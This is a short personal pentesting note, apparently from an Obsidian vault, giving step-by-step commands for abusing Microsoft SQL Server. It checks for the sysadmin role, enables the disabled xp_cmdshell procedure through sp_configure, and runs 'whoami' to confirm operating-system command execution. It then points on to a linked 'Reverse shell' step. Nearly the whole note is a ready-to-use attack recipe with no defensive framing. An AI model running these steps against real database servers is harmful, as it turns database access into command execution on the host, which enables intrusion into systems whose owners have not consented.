
#mssqul
1. Check what is the role the user has in the server.

```
SELECT is_srvrolemember('sysadmin');
```

If returns 1 is `sysadmin`.

2. Check if the `xp_cmdshell` is already activated.

```
EXEC xp_cmdshell 'net user';
```

![[xp_cmshell_error.png]]

It's not activated.

3. Proceed with the activation of `xp_cmdshell`.

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

![[mssql1.png]]

Now, you are able to execute system commands.

4. Test a command.

```
xp_cmdshell "whoami"
```

![[whoami.png]]

**Next step:**  [[Reverse shell]]